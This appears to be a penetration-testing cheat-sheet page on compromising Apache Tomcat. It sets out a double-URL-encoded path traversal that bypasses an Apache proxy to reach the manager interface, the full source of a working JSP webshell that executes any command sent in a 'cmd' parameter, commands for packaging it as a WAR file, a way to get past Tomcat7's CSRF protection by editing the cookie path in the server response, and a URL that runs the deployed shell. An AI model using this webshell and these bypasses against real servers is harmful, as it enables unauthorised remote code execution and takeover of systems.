# Tomcat

## Tomcat

JSP or servlet

### Bypass apache proxy

`/examples/jsp/%252e%252e/%252e%252e/manager/html`

### JSP webshell

```text
<FORM METHOD=GET ACTION='test.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

#### Create a war archive

```csharp
mkdir test
mv test.jsp test
cd test

/usr/lib/jvm/java-14-openjdk/bin/./jar -cvf ../test.war *

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=lcd
added manifest
adding: index.jsp(in = 579) (out= 351)(deflated 39%)
                                                            
```

### Bypass CSRF 

### Tomcat7 is using a CSRF protection in upload field

Upload the file and click on deploy and capture the request .

#### Modify the path 

`jsp/%252e%252e/manager/htm/`

![](../../.gitbook/assets/image%20%28229%29.png)

#### Capture the response in burp

![](../../.gitbook/assets/image%20%28159%29.png)

#### 

#### Modify the CSRF protection path \( / instead of /manager\) in the server response

* refresh the manager page to get the token



![](../../.gitbook/assets/image%20%28248%29.png)

* Modify the response

![](../../.gitbook/assets/image%20%28225%29.png)

```text
Set-Cookie: JSESSIONID=62FC9D661A6E815FCC2FE73B5B8DA686; Path=/; HttpOnly
```

* Modify the DOM path for Deploy

![](../../.gitbook/assets/image%20%2846%29.png)

### Access the webshell

```text
examples//%252e%252e/test/index.jsp?cmd=id
```

![](../../.gitbook/assets/image%20%28278%29%20%281%29.png)

